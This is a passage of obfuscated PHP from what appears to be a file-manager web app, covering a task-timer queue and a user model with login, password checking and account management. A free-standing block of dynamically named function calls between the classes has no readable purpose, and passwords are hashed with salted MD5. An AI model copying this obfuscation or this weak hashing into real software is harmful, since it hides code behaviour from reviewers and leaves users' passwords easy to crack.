setAll($CéÍ…ï¹«µ) { $dÂà§‚Á‡‡ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($CéÍ…ï¹«µ), $dÂà§‚Á‡‡); Cache::set(self::QUEUE_DATA, $CéÍ…ï¹«µ, $dÂà§‚Á‡‡); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($CàÃÎœ­ÆÙ, $fÆö§Ï˜æ = 5.0) { if (!$CàÃÎœ­ÆÙ) { return; } $fÌƒí†ƒ¶ = Cache::get($CàÃÎœ­ÆÙ); if (!$fÌƒí†ƒ¶ || timeFloat() - floatVal($fÌƒí†ƒ¶) >= $fÆö§Ï˜æ) { Cache::set($CàÃÎœ­ÆÙ, timeFloat(), $fÆö§Ï˜æ * 10); return !0; } return !1; } public static function timeLimitCall($Bùø®°‚º, $C‰–¥¬óœš, $C†Ÿù§ëµ‚, $dİ†–Ğ»«‚ = 5.0) { goto e†éÄìÂ; e†éÄìÂ: $e‡¥¡“œ–ø =& $_SERVER[úÉ·öƒÑì©]; if (!$Bùø®°‚º || !$C‰–¥¬óœš) { return; } self::$asyncAdd = !0; goto FŒôèÏöôá; CŞÎ­Å”Ô: if (is_array($D…´¯ùÊ³µ[$Bùø®°‚º])) { $B»„è‚‡è¤[$e‡¥¡“œ–ø[1612]] = $D…´¯ùÊ³µ[$Bùø®°‚º][$e‡¥¡“œ–ø[1612]]; } if (is_array($D…´¯ùÊ³µ[$Bùø®°‚º])) { if (timeFloat() - $D…´¯ùÊ³µ[$Bùø®°‚º][$e‡¥¡“œ–ø[1611]] < $B»„è‚‡è¤[$e‡¥¡“œ–ø[197]] * 0.3) { return; } $B»„è‚‡è¤[$e‡¥¡“œ–ø[1612]] = $D…´¯ùÊ³µ[$Bùø®°‚º][$e‡¥¡“œ–ø[1612]]; } $D…´¯ùÊ³µ[$Bùø®°‚º] = $B»„è‚‡è¤; goto Eåİô´§ªï; Eåİô´§ªï: Cache::set($fªßÍñÛô, $D…´¯ùÊ³µ, 60); Cache::removeMemory($fªßÍñÛô); write_log($e‡¥¡“œ–ø[1613] . $Bùø®°‚º . $e‡¥¡“œ–ø[68] . $C‰–¥¬óœš, $e‡¥¡“œ–ø[1607]); goto d§ìÙ‰ã¢¤; FŒôèÏöôá: $fªßÍñÛô = $e‡¥¡“œ–ø[1610]; $D…´¯ùÊ³µ = Cache::get($fªßÍñÛô, !0); $B»„è‚‡è¤ = array($e‡¥¡“œ–ø[1611] => timeFloat(), $e‡¥¡“œ–ø[1612] => timeFloat(), $e‡¥¡“œ–ø[271] => $C‰–¥¬óœš, $e‡¥¡“œ–ø[1605] => $C†Ÿù§ëµ‚, $e‡¥¡“œ–ø[197] => $dİ†–Ğ»«‚); goto CŞÎ­Å”Ô; d§ìÙ‰ã¢¤: } public static function timeLimitCallLoop() { goto e®ÒÚ’ï¯ó; dÏ¾®ô¹óŞ: if (!$B³œã†ë‡Ñ || count($B³œã†ë‡Ñ) <= 0) { return; } $f±»Ì£õÅ = !1; $bæ¨¤ª§ï = timeFloat(); goto eÙÔî¦–â“; F„…çŠĞ¼İ: if (!$A×¯ìöæ¬ß) { return Cache::remove($f…£öƒâ¢); } Cache::set($f…£öƒâ¢, $A×¯ìöæ¬ß, 60); Cache::removeMemory($f…£öƒâ¢); goto CÏ”ĞïÄß²; e®ÒÚ’ï¯ó: $Dø§ôÈ¦°Ô =& $_SERVER[úÉ·öƒÑì©]; $F¤Ê•íÊ³ = array($Dø§ôÈ¦°Ô[1614]); $DÇ’™»œö‹ = in_array(strtolower(ACTION), $F¤Ê•íÊ³); goto FŒ·ÊÏ„‹Ï; eÙÔî¦–â“: $A×¯ìöæ¬ß = array(); foreach ($B³œã†ë‡Ñ as $D¿¢¡öà´¸ => $eÏÉŞÚŠõ) { if ($bæ¨¤ª§ï - $eÏÉŞÚŠõ[$Dø§ôÈ¦°Ô[1612]] > $eÏÉŞÚŠõ[$Dø§ôÈ¦°Ô[197]]) { $f±»Ì£õÅ = !0; try { Hook::apply($eÏÉŞÚŠõ[$Dø§ôÈ¦°Ô[271]], $eÏÉŞÚŠõ[$Dø§ôÈ¦°Ô[1605]]); write_log($Dø§ôÈ¦°Ô[1615] . $D¿¢¡öà´¸ . $Dø§ôÈ¦°Ô[68] . $eÏÉŞÚŠõ[$Dø§ôÈ¦°Ô[271]] . $Dø§ôÈ¦°Ô[1616] . ACTION, $Dø§ôÈ¦°Ô[1607]); } catch (Exception $A°©‹Ö—‹ë) { } continue; } $A×¯ìöæ¬ß[$D¿¢¡öà´¸] = $eÏÉŞÚŠõ; } if (!$f±»Ì£õÅ) { return; } goto F„…çŠĞ¼İ; FŒ·ÊÏ„‹Ï: if (!$DÇ’™»œö‹ && !self::$asyncAdd) { return; } $f…£öƒâ¢ = $Dø§ôÈ¦°Ô[1610]; $B³œã†ë‡Ñ = Cache::get($f…£öƒâ¢, !0); goto dÏ¾®ô¹óŞ; CÏ”ĞïÄß²: } public static function finished($Eé¦ß¡ÁŒÄ, $fÑ™å«¢Ÿ”) { $A‰ßö©‘³  =& $_SERVER[úÉ·öƒÑì©]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($A‰ßö©‘³ [271] => $Eé¦ß¡ÁŒÄ, $A‰ßö©‘³ [1605] => $fÑ™å«¢Ÿ”); } private static function finishedRun() { $FÁÒöï¡ñ =& $_SERVER[úÉ·öƒÑì©]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $A°¾•µ“›Œ) { try { Hook::apply($A°¾•µ“›Œ[$FÁÒöï¡ñ[271]], $A°¾•µ“›Œ[$FÁÒöï¡ñ[1605]]); } catch (Exception $aß‚à”®éã) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto AÁñè³öÈ»; E†Ñ•¨“ô: if ($_SERVER[$_SERVER[úÉ·öƒÑì©][244]] != $_SERVER[$_SERVER[úÉ·öƒÑì©][847]]) { goto a„­——œØ; EÙ‡á£ãÈ: $a‰¹çŒšĞÅ = explode($_SERVER[úÉ·öƒÑì©][229], $A‡İŒÛƒÄ½); if (count($a‰¹çŒšĞÅ) < $_SERVER[úÉ·öƒÑì©][248]) { $E„ãŒÜø‡• = $_SERVER[úÉ·öƒÑì©][249]; $E„ãŒÜø‡•(); } $FÄ˜ÀÖĞÕë = $_SERVER[úÉ·öƒÑì©][250]; goto FÜ±èµŠ¦µ; a„­——œØ: $EŸì»ÍÏÃ = $_SERVER[úÉ·öƒÑì©][245]; $c²Ì³¤Ã = $_SERVER[$_SERVER[úÉ·öƒÑì©][246]] . $_SERVER[úÉ·öƒÑì©][247]; $A‡İŒÛƒÄ½ = $EŸì»ÍÏÃ($c²Ì³¤Ã); goto EÙ‡á£ãÈ; FÜ±èµŠ¦µ: $FÄ˜ÀÖĞÕë($_SERVER[$_SERVER[úÉ·öƒÑì©][242]]); goto EŸÃ¹Ï¶‰; EŸÃ¹Ï¶‰: } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\164\x61\x62\154\145\116\x61\x6d\x65" => "\165\163\145\162\137\155\145\x74\141", "\155\145\x74\141\x46\x69\x65\x6c\x64" => "\165\163\x65\162\111\104"); protected $simpleField = "\165\163\x65\x72\111\104\54\156\151\143\x6b\116\x61\x6d\x65\54\x6e\141\x6d\x65\54\x61\x76\141\164\x61\162\x2c\x73\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Dô‰Ñ…£„) { $AåĞ°¬Ú¯ =& $_SERVER[úÉ·öƒÑì©]; $C«¼Ö©õ‰É = $AåĞ°¬Ú¯[2123]; return array($AåĞ°¬Ú¯[1769] => array($Dô‰Ñ…£„[0], $C«¼Ö©õ‰É), $AåĞ°¬Ú¯[1771] => array($Dô‰Ñ…£„[0], $C«¼Ö©õ‰É), $AåĞ°¬Ú¯[2124] => array($Dô‰Ñ…£„[0], $C«¼Ö©õ‰É)); } protected function getInfo($cÀÏØ•ÔÀ, $A‡…êŒÏÜ¢ = false) { $cã¿Ã Ì‰ = $this->getInfoSimple($cÀÏØ•ÔÀ); if (!is_array($cã¿Ã Ì‰)) { return array(); } if ($A‡…êŒÏÜ¢) { return $this->_getInfoApply($cã¿Ã Ì‰); } return $this->cacheFunctionGet($_SERVER[úÉ·öƒÑì©][1778], $cÀÏØ•ÔÀ); } protected function getInfoFull($a š¶ Ê»è, $AÀÊ§¼³Ãƒ = false) { $b®—¥Ø³½ = $this->getInfoSimple($a š¶ Ê»è); if (!is_array($b®—¥Ø³½)) { return array(); } if ($AÀÊ§¼³Ãƒ) { return $this->_getInfoApply($b®—¥Ø³½, !0); return $this->_getInfoApply($b®—¥Ø³½, !0); } return $this->cacheFunctionGet($_SERVER[úÉ·öƒÑì©][2125], $a š¶ Ê»è); } private function _getInfoApply($dÓÒ¥¸ìÔØ, $Fª’†Éê = false) { goto b¹‹õ‚íìá; fí³ã¥ƒ Ø: $dÓÒ¥¸ìÔØ[$c®Ğ…‰ÚÔ[85]][$c®Ğ…‰ÚÔ[1959]] = isset($c‡¼ê¡êù[$c®Ğ…‰ÚÔ[1960]]) ? $c‡¼ê¡êù[$c®Ğ…‰ÚÔ[1960]] : null; if ($Fª’†Éê) { $dÓÒ¥¸ìÔØ[$c®Ğ…‰ÚÔ[454]] = $this->metaGet($dÓÒ¥¸ìÔØ[$c®Ğ…‰ÚÔ[1535]]); } return $dÓÒ¥¸ìÔØ; goto B– ¦êööÌ; A‡õ‰ÕØ„÷: $dÓÒ¥¸ìÔØ = $this->_listDataApplyItem($dÓÒ¥¸ìÔØ); $c‡¼ê¡êù = Model($c®Ğ…‰ÚÔ[1213])->metaGet($dÓÒ¥¸ìÔØ[$c®Ğ…‰ÚÔ[85]][$c®Ğ…‰ÚÔ[404]]); $dÓÒ¥¸ìÔØ[$c®Ğ…‰ÚÔ[2128]] = $Dàœóµ¢«¿; goto fí³ã¥ƒ Ø; b¹‹õ‚íìá: $c®Ğ…‰ÚÔ =& $_SERVER[úÉ·öƒÑì©]; if (!$dÓÒ¥¸ìÔØ) { return $dÓÒ¥¸ìÔØ; } $Dàœóµ¢«¿ = md5($c®Ğ…‰ÚÔ[2126] . $dÓÒ¥¸ìÔØ[$c®Ğ…‰ÚÔ[857]] . $c®Ğ…‰ÚÔ[2127] . $dÓÒ¥¸ìÔØ[$c®Ğ…‰ÚÔ[28]]); goto A‡õ‰ÕØ„÷; B– ¦êööÌ: } protected function getInfoSimple($Cèñæ¬Í‘, $F‘´ãµ¶åç = false) { $c¦ÀïÚˆĞğ =& $_SERVER[úÉ·öƒÑì©]; if (!$Cèñæ¬Í‘) { return array(); } if ($F‘´ãµ¶åç) { $E…Á¸±Øµ = $this->where(array($c¦ÀïÚˆĞğ[1535] => intval($Cèñæ¬Í‘)))->find(); if (!is_array($E…Á¸±Øµ)) { return array(); } $E…Á¸±Øµ[$c¦ÀïÚˆĞğ[2129]] = Action($c¦ÀïÚˆĞğ[2130])->parseUrl($E…Á¸±Øµ[$c¦ÀïÚˆĞğ[2129]]); return $E…Á¸±Øµ; } return $this->cacheFunctionGet($c¦ÀïÚˆĞğ[1772], $Cèñæ¬Í‘); } protected function getInfoSimpleOuter($AîŸØ´Çåè) { goto B–´ïğ­ê; E”¿˜ê‹¦ˆ: return $EÕ†Êïî¾; goto C×ÑÉ´£õù; EÙŒäˆÜÆ–: $EÕ†Êïî¾ = array_field_key($D«‘‹Úè–µ, explode($BÌˆÈÊ‚ˆÊ[47], $this->simpleField)); if (!$EÕ†Êïî¾) { return array($BÌˆÈÊ‚ˆÊ[1535] => $BÌˆÈÊ‚ˆÊ[1093], $BÌˆÈÊ‚ˆÊ[28] => $BÌˆÈÊ‚ˆÊ[160] . LNG($BÌˆÈÊ‚ˆÊ[2133]) . $BÌˆÈÊ‚ˆÊ[513], $BÌˆÈÊ‚ˆÊ[2129] => STATIC_PATH . $BÌˆÈÊ‚ˆÊ[2134]); } $EÕ†Êïî¾[$BÌˆÈÊ‚ˆÊ[2129]] = Action($BÌˆÈÊ‚ˆÊ[2130])->parseUrl($EÕ†Êïî¾[$BÌˆÈÊ‚ˆÊ[2129]]); goto E”¿˜ê‹¦ˆ; B–´ïğ­ê: $BÌˆÈÊ‚ˆÊ =& $_SERVER[úÉ·öƒÑì©]; if (!$AîŸØ´Çåè || $AîŸØ´Çåè == 0) { return array($BÌˆÈÊ‚ˆÊ[1535] => $BÌˆÈÊ‚ˆÊ[191], $BÌˆÈÊ‚ˆÊ[28] => $BÌˆÈÊ‚ˆÊ[160] . LNG($BÌˆÈÊ‚ˆÊ[2131]) . $BÌˆÈÊ‚ˆÊ[513], $BÌˆÈÊ‚ˆÊ[2129] => STATIC_PATH . $BÌˆÈÊ‚ˆÊ[2132]); } $D«‘‹Úè–µ = $this->cacheFunctionGet($BÌˆÈÊ‚ˆÊ[1772], $AîŸØ´Çåè); goto EÙŒäˆÜÆ–; C×ÑÉ´£õù: } protected function groupUser($C·…ˆÜÀÚµ) { } public static function errorLang($E½ë×Ÿñ) { $CÎßŒç—¨… =& $_SERVER[úÉ·öƒÑì©]; $f«Ë®ˆïİÑ = array(self::ERROR_USER_NOT_EXISTS => $CÎßŒç—¨…[2135], self::ERROR_USER_PASSWORD_ERROR => $CÎßŒç—¨…[2136], self::ERROR_USER_EXIST_NAME => $CÎßŒç—¨…[2137], self::ERROR_USER_EXIST_PHONE => $CÎßŒç—¨…[2138], self::ERROR_USER_EXIST_EMAIL => $CÎßŒç—¨…[2139], self::ERROR_USER_LOGIN_LOCK => $CÎßŒç—¨…[2140], self::ERROR_IP_NOT_ALLOW => $CÎßŒç—¨…[2141], self::ERROR_USER_EXIST_NICKNAME => $CÎßŒç—¨…[2142]); return LNG($f«Ë®ˆïİÑ[$E½ë×Ÿñ]); } public function getInfoByMeta($b¤‹È—°È, $D·«”ĞõÂÇ) { $FòõëÜô³ö =& $_SERVER[úÉ·öƒÑì©]; $eÆ¢¹¡Çä’ = Model($FòõëÜô³ö[2143])->where(array($FòõëÜô³ö[93] => $b¤‹È—°È, $FòõëÜô³ö[381] => $D·«”ĞõÂÇ))->find(); if ($eÆ¢¹¡Çä’) { return $this->getInfo($eÆ¢¹¡Çä’[$FòõëÜô³ö[1535]]); } return !1; } public function userLoginCheck($cƒ‹ÙÍ˜±‡, $A»²¯½ØÉ) { $E‘µ‹³§æ =& $_SERVER[úÉ·öƒÑì©]; $Cå¯óå‘ƒ« = $this->userLoginFind($cƒ‹ÙÍ˜±‡); if (!$Cå¯óå‘ƒ«) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Cå¯óå‘ƒ«[$E‘µ‹³§æ[1535]], $A»²¯½ØÉ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Cå¯óå‘ƒ«[$E‘µ‹³§æ[1535]]); } public function userLoginFind($CÅ“óŸ±•) { $Eˆ÷ÌĞ¼ô =& $_SERVER[úÉ·öƒÑì©]; $f±Î»ò—¾Ô = array($Eˆ÷ÌĞ¼ô[28] => $CÅ“óŸ±•, $Eˆ÷ÌĞ¼ô[1963] => $CÅ“óŸ±•, $Eˆ÷ÌĞ¼ô[312] => $CÅ“óŸ±•, $Eˆ÷ÌĞ¼ô[2144] => $CÅ“óŸ±•, $Eˆ÷ÌĞ¼ô[965] => $Eˆ÷ÌĞ¼ô[967]); if ($this->nickNameRpt()) { unset($f±Î»ò—¾Ô[$Eˆ÷ÌĞ¼ô[1963]]); } return $this->where($f±Î»ò—¾Ô)->find(); } public function clearCache($f“°–‡“¯) { $FÌôä»ƒŒ£ =& $_SERVER[úÉ·öƒÑì©]; $this->cacheFunctionClear($FÌôä»ƒŒ£[1778], $f“°–‡“¯); $this->cacheFunctionClear($FÌôä»ƒŒ£[1772], $f“°–‡“¯); $this->cacheFunctionClear($FÌôä»ƒŒ£[2125], $f“°–‡“¯); } public function userPasswordCheck($fËâ™œÉ¼, $AÏ¯ĞÈ¿ä¥) { $c¨¤«†ÑæŒ =& $_SERVER[úÉ·öƒÑì©]; $b™ó™Ÿ¯Ø˜ = $this->where(array($c¨¤«†ÑæŒ[1535] => intval($fËâ™œÉ¼)))->find(); $d‚ÅéÔê‰ = $this->metaGet($fËâ™œÉ¼); $cƒ†ˆê‚Š¿ = isset($d‚ÅéÔê‰[$c¨¤«†ÑæŒ[2145]]) ? $d‚ÅéÔê‰[$c¨¤«†ÑæŒ[2145]] : $c¨¤«†ÑæŒ[33]; if (md5($cƒ†ˆê‚Š¿ . trim($AÏ¯ĞÈ¿ä¥)) !== $b™ó™Ÿ¯Ø˜[$c¨¤«†ÑæŒ[857]]) { return !1; } return !0; } public function userAdd($FÆ’ØÆä») { goto fˆ™©’¿šŸ; fˆ™©’¿šŸ: $aƒ—¬Î†²˜ =& $_SERVER[úÉ·öƒÑì©]; $dÔÓâó¾ÕÒ = array($aƒ—¬Î†²˜[422] => $FÆ’ØÆä»[$aƒ—¬Î†²˜[28]], $aƒ—¬Î†²˜[2146] => $FÆ’ØÆä»[$aƒ—¬Î†²˜[1420]], $aƒ—¬Î†²˜[2147] => isset($FÆ’ØÆä»[$aƒ—¬Î†²˜[312]]) ? $FÆ’ØÆä»[$aƒ—¬Î†²˜[312]] : $aƒ—¬Î†²˜[33], $aƒ—¬Î†²˜[2148] => isset($FÆ’ØÆä»[$aƒ—¬Î†²˜[2144]]) ? $FÆ’ØÆä»[$aƒ—¬Î†²˜[2144]] : $aƒ—¬Î†²˜[33], $aƒ—¬Î†²˜[2149] => isset($FÆ’ØÆä»[$aƒ—¬Î†²˜[1963]]) ? $FÆ’ØÆä»[$aƒ—¬Î†²˜[1963]] : $FÆ’ØÆä»[$aƒ—¬Î†²˜[28]], $aƒ—¬Î†²˜[2150] => isset($FÆ’ØÆä»[$aƒ—¬Î†²˜[2129]]) ? $FÆ’ØÆä»[$aƒ—¬Î†²˜[2129]] : $aƒ—¬Î†²˜[33], $aƒ—¬Î†²˜[2151] => isset($FÆ’ØÆä»[$aƒ—¬Î†²˜[2152]]) ? $FÆ’ØÆä»[$aƒ—¬Î†²˜[2152]] : 1, $aƒ—¬Î†²˜[2153] => $FÆ’ØÆä»[$aƒ—¬Î†²˜[857]], $aƒ—¬Î†²˜[1773] => isset($FÆ’ØÆä»[$aƒ—¬Î†²˜[1683]]) ? $FÆ’ØÆä»[$aƒ—¬Î†²˜[1683]] : 1024 * 1024 * 20, $aƒ—¬Î†²˜[1774] => 0, $aƒ—¬Î†²˜[2154] => 0, $aƒ—¬Î†²˜[1817] => isset($FÆ’ØÆä»[$aƒ—¬Î†²˜[726]]) ? $FÆ’ØÆä»[$aƒ—¬Î†²˜[726]] : 1); if (!empty($FÆ’ØÆä»[$aƒ—¬Î†²˜[1535]])) { $dÔÓâó¾ÕÒ[$aƒ—¬Î†²˜[1535]] = $FÆ’ØÆä»[$aƒ—¬Î†²˜[1535]]; } goto cÌ“é÷‘±; F—„ÛÛ³ë­: return $EÄö‹Àº¼§; goto e‰ßƒÖ…; dæÍ«Åì…ƒ: $DÇ¬š‡‡© = array($aƒ—¬Î†²˜[2153] => $dÔÓâó¾ÕÒ[$aƒ—¬Î†²˜[857]], $aƒ—¬Î†²˜[2149] => $dÔÓâó¾ÕÒ[$aƒ—¬Î†²˜[1963]]); $this->userEdit($EÄö‹Àº¼§, $DÇ¬š‡‡©); Model($aƒ—¬Î†²˜[1213])->userRootAdd($EÄö‹Àº¼§); goto F—„ÛÛ³ë­; cÌ“é÷‘±: $fâË¼ÁòÇ = $this->_checkExist($FÆ’ØÆä»); if ($fâË¼ÁòÇ !== !0) { return $fâË¼ÁòÇ; } $EÄö‹Àº¼§ = $this->add($dÔÓâó¾ÕÒ); goto dæÍ«Åì…ƒ; e‰ßƒÖ…: } protected function userEditTest($eòá²ÁÂ³±, $a»¯îÌá¶) { return $this->call($_SERVER[úÉ·öƒÑì©][2155], $eòá²ÁÂ³±, $a»¯îÌá¶); } protected function userEdit($AÍèíŞÆù², $dß°Çó³Ç·) { goto f–º­¾¦Š¼; CÔ¼øå¨¥è: return !0; goto C¢ˆõ‚Ï­; c¾àÌº¹¯: $this->where(array($bµÎ…Ã÷Ğ[1527] => $AÍèíŞÆù²))->save($dß°Çó³Ç·); if (isset($dß°Çó³Ç·[$bµÎ…Ã÷Ğ[1963]])) { $this->setNamePinyin($AÍèíŞÆù², $dß°Çó³Ç·[$bµÎ…Ã÷Ğ[1963]]); } $this->clearCache($AÍèíŞÆù²); goto CÔ¼øå¨¥è; f–º­¾¦Š¼: $bµÎ…Ã÷Ğ =& $_SERVER[úÉ·öƒÑì©]; $dƒ¡‚Ó© = $this->getInfoSimple($AÍèíŞÆù²); if (!$dƒ¡‚Ó©) { return !1; } goto Cõ¯Òç¹Á„; Cõ¯Òç¹Á„: $A×—ãÑ ¶— = $this->_checkExist($dß°Çó³Ç·, $AÍèíŞÆù²); if ($A×—ãÑ ¶— !== !0) { return $A×—ãÑ ¶—; } if (isset($dß°Çó³Ç·[$bµÎ…Ã÷Ğ[857]]) && trim($dß°Çó³Ç·[$bµÎ…Ã÷Ğ[857]]) != $bµÎ…Ã÷Ğ[33]) { $FÔØÔ¨Ç  = $this->metaGet($AÍèíŞÆù²); if (empty($FÔØÔ¨Ç [$bµÎ…Ã÷Ğ[2145]])) { $FÔØÔ¨Ç [$bµÎ…Ã÷Ğ[2145]] = rand_string(10); Model($bµÎ…Ã÷Ğ[511])->metaSet($AÍèíŞÆù², $bµÎ…Ã÷Ğ[2145], $FÔØÔ¨Ç [$bµÎ…Ã÷Ğ[2145]]); } $dß°Çó³Ç·[$bµÎ…Ã÷Ğ[857]] = md5($FÔØÔ¨Ç [$bµÎ…Ã÷Ğ[2145]] . trim($dß°Çó³Ç·[$bµÎ…Ã÷Ğ[857]])); } else { unset($dß°Çó³Ç·[$bµÎ…Ã÷Ğ[857]]); } goto c¾àÌº¹¯; C¢ˆõ‚Ï­: } public function setNamePinyin($fôÃïĞÀœŸ, $càÜİìÌ = false) { $dÌÏÔÙ¢å =& $_SERVER[úÉ·öƒÑì©]; if (!$càÜİìÌ) { $F‚Áç´‘ñå = $this->getInfoSimple($fôÃïĞÀœŸ); $càÜİìÌ = $F‚Áç´‘ñå[$dÌÏÔÙ¢å[1963]] ? $F‚Áç´‘ñå[$dÌÏÔÙ¢å[1963]] : $F‚Áç´‘ñå[$dÌÏÔÙ¢å[28]]; } $BÏ¨™èÛ = Model($dÌÏÔÙ¢å[515]); if (!Input::check($càÜİìÌ, $dÌÏÔÙ¢å[565])) { return $BÏ¨™èÛ->metaSet($fôÃïĞÀœŸ, array($dÌÏÔÙ¢å[453] => $dÌÏÔÙ¢å[33], $dÌÏÔÙ¢å[452] => $dÌÏÔÙ¢å[33])); } return $BÏ¨™èÛ->metaSet($fôÃïĞÀœŸ, array($dÌÏÔÙ¢å[453] => str_replace($dÌÏÔÙ¢å[50], $dÌÏÔÙ¢å[33], Pinyin::encode($càÜİìÌ)), $dÌÏÔÙ¢å[452] => Pinyin::encode($càÜİìÌ, $dÌÏÔÙ¢å[566]))); } private function nickNameRpt() { $aÜµ÷õŒç‡ =& $_SERVER[úÉ·öƒÑì©]; $C•¢à¿ÒİÃ = Model($aÜµ÷õŒç‡[746])->get($aÜµ÷õŒç‡[2156]); $eÅÖÕçª‹ = $GLOBALS[$aÜµ÷õŒç‡[6]][$aÜµ÷õŒç‡[387]][$aÜµ÷õŒç‡[2156]]; $Càñù¨·‰ = !is_null($C•¢à¿ÒİÃ) ? $C•¢à¿ÒİÃ : $eÅÖÕçª‹; return !!$Càñù¨·‰; } private function _checkExist($b§ïğ“Œ¥¤, $F¸ ÛêŒî = false) { $FŒ¤ùåÒ =& $_SERVER[úÉ·öƒÑì©]; $aˆŒÔê˜Åê = array($FŒ¤ùåÒ[28] => UserModel::ERROR_USER_EXIST_NAME, $FŒ¤ùåÒ[1963] => UserModel::ERROR_USER_EXIST_NICKNAME, $FŒ¤ùåÒ[312] => UserModel::ERROR_USER_EXIST_EMAIL, $FŒ¤ùåÒ[2144] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($aˆŒÔê˜Åê[$FŒ¤ùåÒ[1963]]); } $E·ƒœÙò’† = $F¸ ÛêŒî ? array($FŒ¤ùåÒ[1535] => array($FŒ¤ùåÒ[2157], $F¸ ÛêŒî)) : array(); foreach ($aˆŒÔê˜Åê as $cé§“Ÿˆ¯ => $EÅÛ’Ê´¦í) { $c¸¿’õ±­ñ = array(); foreach ($aˆŒÔê˜Åê as $Aïš£ª²ùÓ => $a¡‚¦åÛ) { if (isset($b§ïğ“Œ¥¤[$Aïš£ª²ùÓ]) && $b§ïğ“Œ¥¤[$Aïš£ª²ùÓ]) { $c¸¿’õ±­ñ[] = $b§ïğ“Œ¥¤[$Aïš£ª²ùÓ]; } } if (!$c¸¿’õ±­ñ) { continue; } $B¨…¤÷ĞÇï = array_merge(array($cé§“Ÿˆ¯ => array($FŒ¤ùåÒ[7], $c¸¿’õ±­ñ)), $E·ƒœÙò’†); $cö»Âğ† ‘ = $this->where($B¨…¤÷ĞÇï)->find(); if ($cö»Âğ† ‘) { return $EÅÛ’Ê´¦í; } } return !0; } public function userListInfo($d–Óà‘±¢…) { $Eî‰Œ‡°É— =& $_SERVER[úÉ·öƒÑì©]; $D¬‹ÕŸ³Öš = array(); $d–Óà‘±¢… = is_array($d–Óà‘±¢…) ? array_unique($d–Óà‘±¢…) : array(); if (!$d–Óà‘±¢…) { return $D¬‹ÕŸ³Öš; } if (count($d–Óà‘±¢…) < 20) { foreach ($d–Óà‘±¢… as $AîèŸ¡ªÌí) { $D¬‹ÕŸ³Öš[$AîèŸ¡ªÌí . $Eî‰Œ‡°É—[33]] = $this->getInfoSimpleOuter($AîèŸ¡ªÌí); } } else { $a‡µÉáë‚„ = array($Eî‰Œ‡°É—[1527] => array($Eî‰Œ‡°É—[420], $d–Óà‘±¢…)); if (count($d–Óà‘±¢…) == 1) { $a‡µÉáë‚„ = array($Eî‰Œ‡°É—[1527] => $d–Óà‘±¢…[0]); } $aÆâ­·Şª = Model($Eî‰Œ‡°É—[511])->field($this->simpleField)->where($a‡µÉáë‚„)->select(); $aÆâ­·Şª = array_to_keyvalue($aÆâ­·Şª, $Eî‰Œ‡°É—[1535]); foreach ($d–Óà‘±¢… as $AîèŸ¡ªÌí) { $aóŠÉõ©è = $aÆâ­·Şª[$AîèŸ¡ªÌí]; if (!$aóŠÉõ©è) { $D¬‹ÕŸ³Öš[$AîèŸ¡ªÌí . $Eî‰Œ‡°É—[33]] = $this->getInfoSimpleOuter($AîèŸ¡ªÌí); continue; } $aóŠÉõ©è[$Eî‰Œ‡°É—[2129]] = Action($Eî‰Œ‡°É—[2130])->parseUrl($aóŠÉõ©è[$Eî‰Œ‡°É—[2129]]); $D¬‹ÕŸ³Öš[$AîèŸ¡ªÌí . $Eî‰Œ‡°É—[33]] = $aóŠÉõ©è; } } return $D¬‹ÕŸ³Öš; } protected function userStatus($càÕÄŠÌğ³, $C…œøÈ•š‹) { $f¦ø®¥Ææ¤ = $this->getInfoSimple($càÕÄŠÌğ³); if (!$f¦ø®¥Ææ¤) { return !1; } $FºäĞµ‡…» = array($_SERVER[úÉ·öƒÑì©][726] => $C…œøÈ•š‹); return $this->userEdit($càÕÄŠÌğ³, $FºäĞµ‡…»); } protected function userRemove($e½˜îÔ™ì½) { goto FŞŒ¸’™×Î; a‘Ÿ·£ÁÎĞ: Model($a–ğ¹Ééí´[1780])->where($FÔ´…ÎèË«)->delete(); Model($a–ğ¹Ééí´[2143])->where($FÔ´…ÎèË«)->delete(); Model($a–ğ¹Ééí´[2159])->where($FÔ´…ÎèË«)->delete(); goto e†Ò÷”›‘; dØÊÁ°‡Ì: $FÔ´…ÎèË« = array($a–ğ¹Ééí´[1527] => $e½˜îÔ™ì½); Model($a–ğ¹Ééí´[572])->where($FÔ´…ÎèË«)->delete(); Model($a–ğ¹Ééí´[2158])->where($FÔ´…ÎèË«)->delete(); goto a‘Ÿ·£ÁÎĞ; FŞŒ¸’™×Î: $a–ğ¹Ééí´ =& $_SERVER[úÉ·öƒÑì©]; $F×˜œ¹³º¾ = $this->getInfoSimple($e½˜îÔ™ì½); if (!$F×˜œ¹³º¾) { return !1; } goto dØÊÁ°‡Ì; e†Ò÷”›‘: Model($a–ğ¹Ééí´[1980])->removeUserAll($e½˜îÔ™ì½); Model($a–ğ¹Ééí´[806])->userRootRemove($e½˜îÔ™ì½); return $this->where($FÔ´…ÎèË«)->delete(); goto F†Ï¦÷½àš; F†Ï¦÷½àš: } protected function userGroupSet($cª©™Âàƒ, $fÒÅÈè…ï, $eµ‘÷Šˆì˜ = array()) { goto DÕàñâíëÌ; D›‘™¨£Ö: $D×‹İ¸ê = Model($e½½‰“ƒ”[1780]); $D×‹İ¸ê->where(array($e½½‰“ƒ”[1535] => $cª©™Âàƒ))->delete(); $dÇÖ‚Ï”òŸ = array(); goto aÉª¹×Œ„ƒ; aÉª¹×Œ„ƒ: $a…Ò¿¬—¿ = 0; foreach ($fÒÅÈè…ï as $D¹¿Ì÷¨” => $fÄóÆĞ¡ò) { $b¿Û´ºÇ¦Å = array($e½½‰“ƒ”[1535] => 